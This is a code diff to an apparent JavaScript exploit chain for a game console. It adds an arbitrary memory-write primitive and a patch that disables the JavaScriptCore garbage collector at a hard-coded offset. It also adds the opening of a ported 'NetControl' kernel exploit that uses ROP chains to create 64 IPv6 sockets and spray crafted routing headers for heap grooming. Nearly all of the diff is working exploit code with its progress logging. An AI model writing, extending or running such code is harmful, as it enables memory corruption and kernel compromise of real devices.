@@ -150,6 +150,23 @@ var mem = {
     master[5] = addr.hi()
     slave[0] = val
   },
+  write1: function (addr, val) {
+    var byte_val = (val instanceof BigInt) ? val.lo() : val
+    var offset = addr.lo() & 3
+    var aligned_addr = new BigInt(addr.hi(), addr.lo() & ~3)
+
+    // Read current 4-byte value at aligned address
+    master[4] = aligned_addr.lo()
+    master[5] = aligned_addr.hi()
+    var current = slave[0]
+
+    // Modify the specific byte
+    var mask = 0xFF << (offset * 8)
+    var new_val = (current & ~mask) | ((byte_val & 0xFF) << (offset * 8))
+
+    // Write back the modified 4-byte value
+    slave[0] = new_val
+  },
   addrof: function (obj) {
     leak_obj.obj = obj
     return mem.read8(leak_obj_addr.add(new BigInt(0, 0x10)))
@@ -240,6 +257,19 @@ log(`base_addr: ${base_addr}`)
 log(`libc_addr: ${libc_addr}`)
 log(`libcurl_addr: ${libcurl_addr}`)
 log(`eboot_addr: ${eboot_addr}`)
+
+// Disable GC by patching JSC global variable
+// disableGC offset: 0x2275B20 (Ghidra) - 0x400000 (image base) = 0x1E75B20
+var DISABLE_GC_OFFSET = 0x1E75B20
+var disable_gc_addr = base_addr.add(new BigInt(0, DISABLE_GC_OFFSET))
+var gc_old_value = mem.read4(disable_gc_addr)
+log('[GC] Current disableGC: ' + gc_old_value.toString())
+mem.write4(disable_gc_addr, new BigInt(0, 1))
+var gc_new_value = mem.read4(disable_gc_addr)
+log('[GC] New disableGC: ' + gc_new_value.toString())
+if (gc_new_value.lo() === 1) {
+  log('[GC] Successfully disabled GC')
+}
 
 var gadgets = {
   RET: base_addr.add(new BigInt(0, 0x4C)),
@@ -799,4 +829,233 @@ try {
   log('ERROR: ROP execution failed - ' + e.message)
   mem.free(store_addr)
   mem.free(module_info_buf)
+}
+
+// ============================================================================
+// NetControl Kernel Exploit (poop.java port)
+// ============================================================================
+
+log('')
+log('=== NetControl Kernel Exploit ===')
+
+// Check required syscalls
+if (!kapi.socket_found || !kapi.setsockopt_found || !kapi.getsockopt_found || !kapi.close_found) {
+  log('ERROR: Required syscalls not found')
+  log('  socket: ' + kapi.socket_found)
+  log('  setsockopt: ' + kapi.setsockopt_found)
+  log('  getsockopt: ' + kapi.getsockopt_found)
+  log('  close: ' + kapi.close_found)
+} else {
+  log('All required syscalls found')
+
+  // Storage for IPv6 sockets
+  var ipv6_sockets = new Int32Array(IPV6_SOCK_NUM)
+  var socket_count = 0
+
+  // Pre-allocate buffers
+  var rthdr_buf = mem.malloc(UCRED_SIZE)
+  var optlen_buf = mem.malloc(8)
+
+  log('')
+  log('[SOCKET] Creating ' + IPV6_SOCK_NUM + ' IPv6 sockets...')
+
+  // Create 64 IPv6 sockets
+  for (var i = 0; i < IPV6_SOCK_NUM; i++) {
+    var socket_wrapper = new BigInt(kapi.socket_hi, kapi.socket_lo)
+    var socket_store_addr = mem.malloc(0x10)
+    var socket_insts = build_rop_chain(
+      socket_wrapper,
+      new BigInt(0, AF_INET6),
+      new BigInt(0, SOCK_STREAM),
+      new BigInt(0, 0)
+    )
+    rop.store(socket_insts, socket_store_addr, 1)
+
+    try {
+      rop.execute(socket_insts, socket_store_addr, 0x10)
+      var fd = mem.read8(socket_store_addr.add(new BigInt(0, 8)))
+      mem.free(socket_store_addr)
+
+      if (fd.hi() === 0xFFFFFFFF) {
+        log('[SOCKET] ERROR: socket() failed at index ' + i)
+        break
+      }
+
+      ipv6_sockets[i] = fd.lo()
+      socket_count++
+
+      if (i % 10 === 0) {
+        log('[SOCKET] Created socket ' + i + '/' + IPV6_SOCK_NUM + ', fd=' + fd.lo())
+      }
+    } catch (e) {
+      log('[SOCKET] ERROR: Failed to create socket ' + i + ' - ' + e.message)
+      mem.free(socket_store_addr)
+      break
+    }
+  }
+
+  log('[SOCKET] Created ' + socket_count + ' sockets')
+
+  if (socket_count === IPV6_SOCK_NUM) {
+    log('')
+    log('[INIT] Initializing pktopts on all sockets...')
+
+    // Debug: check if required variables are defined
+    if (typeof IPPROTO_IPV6 === 'undefined') {
+      log('ERROR: IPPROTO_IPV6 is undefined - check globals.js is loaded')
+    }
+    if (typeof IPV6_RTHDR === 'undefined') {
+      log('ERROR: IPV6_RTHDR is undefined - check globals.js is loaded')
+    }
+    if (typeof kapi === 'undefined') {
+      log('ERROR: kapi is undefined')
+    } else if (!kapi.setsockopt_found) {
+      log('ERROR: setsockopt wrapper not found')
+    }
+
+    // Initialize pktopts by calling setsockopt with NULL buffer (freeRthdr)
+    var init_count = 0
+    for (var i = 0; i < IPV6_SOCK_NUM; i++) {
+      var init_wrapper = new BigInt(kapi.setsockopt_hi, kapi.setsockopt_lo)
+      var init_store_addr = mem.malloc(0x10)
+      var init_insts = build_rop_chain(
+        init_wrapper,
+        new BigInt(0, ipv6_sockets[i]),
+        new BigInt(0, IPPROTO_IPV6),
+        new BigInt(0, IPV6_RTHDR),
+        new BigInt(0, 0), // NULL buffer
+        new BigInt(0, 0)  // size 0
+      )
+      rop.store(init_insts, init_store_addr, 1)
+
+      try {
+        rop.execute(init_insts, init_store_addr, 0x10)
+        var ret = mem.read8(init_store_addr.add(new BigInt(0, 8)))
+        mem.free(init_store_addr)
+
+        if (ret.hi() !== 0xFFFFFFFF || ret.lo() !== 0xFFFFFFFF) {
+          init_count++
+        }
+      } catch (e) {
+        log('[INIT] ERROR: Exception at socket ' + i + ': ' + e.message)
+        mem.free(init_store_addr)
+        break
+      }
+    }
+
+    log('[INIT] Initialized ' + init_count + ' pktopts structures')
+
+    if (init_count > 0) {
+      log('')
+      log('[SPRAY] Spraying routing headers...')
+
+    // Build routing header in buffer - exactly like poop.java buildRthdr()
+    var rthdr_len = ((UCRED_SIZE >> 3) - 1) & ~1
+    var rthdr_size = (rthdr_len + 1) << 3
+
+    // Zero out buffer first
+    for (var z = 0; z < UCRED_SIZE; z += 4) {
+      mem.write4(rthdr_buf.add(new BigInt(0, z)), new BigInt(0, 0))
+    }
+
+    // Write header bytes individually - exactly like poop.java putByte()
+    mem.write1(rthdr_buf.add(new BigInt(0, 0)), 0)                  // buf.putByte(0x00, (byte) 0)
+    mem.write1(rthdr_buf.add(new BigInt(0, 1)), rthdr_len)          // buf.putByte(0x01, (byte) len)
+    mem.write1(rthdr_buf.add(new BigInt(0, 2)), IPV6_RTHDR_TYPE_0)  // buf.putByte(0x02, (byte) IPV6_RTHDR_TYPE_0)
+    mem.write1(rthdr_buf.add(new BigInt(0, 3)), (rthdr_len >> 1))   // buf.putByte(0x03, (byte) (len >> 1))
+
+    // Spray routing headers on all sockets
+    var spray_count = 0
+    for (var i = 0; i < IPV6_SOCK_NUM; i++) {
+      var setsockopt_wrapper = new BigInt(kapi.setsockopt_hi, kapi.setsockopt_lo)
+      var setsockopt_store_addr = mem.malloc(0x10)
+      var setsockopt_insts = build_rop_chain(
+        setsockopt_wrapper,
+        new BigInt(0, ipv6_sockets[i]),
+        new BigInt(0, IPPROTO_IPV6),
+        new BigInt(0, IPV6_RTHDR),
+        rthdr_buf,
+        new BigInt(0, rthdr_size)
+      )
+      rop.store(setsockopt_insts, setsockopt_store_addr, 1)
+
+      try {
+        rop.execute(setsockopt_insts, setsockopt_store_addr, 0x10)
+        var ret = mem.read8(setsockopt_store_addr.add(new BigInt(0, 8)))
+        mem.free(setsockopt_store_addr)
+
+        if (ret.hi() === 0xFFFFFFFF && ret.lo() === 0xFFFFFFFF) {
+          log('[SPRAY] ERROR: setsockopt failed at socket ' + i)
+          break
+        }
+
+        spray_count++
+
+        if (i % 20 === 0) {
+          log('[SPRAY] Sprayed ' + i + '/' + IPV6_SOCK_NUM)
+        }
+      } catch (e) {
+        log('[SPRAY] ERROR: Exception at socket ' + i + ': ' + e.message)
+        mem.free(setsockopt_store_addr)
+        break
+      }
+    }
+
+      if (spray_count === IPV6_SOCK_NUM) {
+        log('[SPRAY] SUCCESS - All ' + spray_count + ' routing headers sprayed')
+      } else {
+        log('[SPRAY] FAILED - Only sprayed ' + spray_count + '/' + IPV6_SOCK_NUM)
+      }
+    }
+  }
+
+  // Read back routing headers with getsockopt to verify
+  if (spray_count > 0) {
+    log('[VERIFY] Reading back routing headers...')
+
+    var getsockopt_wrapper = new BigInt(kapi.getsockopt_hi, kapi.getsockopt_lo)
+    var readback_buf = mem.malloc(UCRED_SIZE)
+    var readback_len_buf = mem.malloc(8)
+    var verify_count = 0
+
+    for (var i = 0; i < spray_count; i++) {
+      // Set optlen to buffer size
+      mem.write4(readback_len_buf, new BigInt(0, UCRED_SIZE))
+
+      var getsockopt_store_addr = mem.malloc(0x100)
+      var getsockopt_insts = build_rop_chain(
+        getsockopt_wrapper,
+        new BigInt(0, ipv6_sockets[i]),
+        new BigInt(0, IPPROTO_IPV6),
+        new BigInt(0, IPV6_RTHDR),
+        readback_buf,
+        readback_len_buf
+      )
+      rop.store(getsockopt_insts, getsockopt_store_addr, 1)
+      rop.execute(getsockopt_insts, getsockopt_store_addr, 0x10)
+
+      var ret = mem.read8(getsockopt_store_addr.add(new BigInt(0, 8)))
+      var actual_len = mem.read4(readback_len_buf)
+
+      mem.free(getsockopt_store_addr)
+
+      if (ret.hi() === 0 && ret.lo() === 0) {
+        verify_count++
+        if (i % 20 === 0) {
+          log('[VERIFY] Socket ' + i + ' getsockopt returned: ' + ret.lo() + ', length: ' + actual_len.lo())
+        }
+      } else {
+        log('[VERIFY] Socket ' + i + ' getsockopt FAILED, returned: ' + ret.toString())
+      }
+    }
+
+    log('[VERIFY] ' + verify_count + '/' + spray_count + ' routing headers verified')
+
+    mem.free(readback_buf)
+    mem.free(readback_len_buf)
+  }
+
+  // Cleanup
+  mem.free(rthdr_buf)
+  mem.free(optlen_buf)
 }
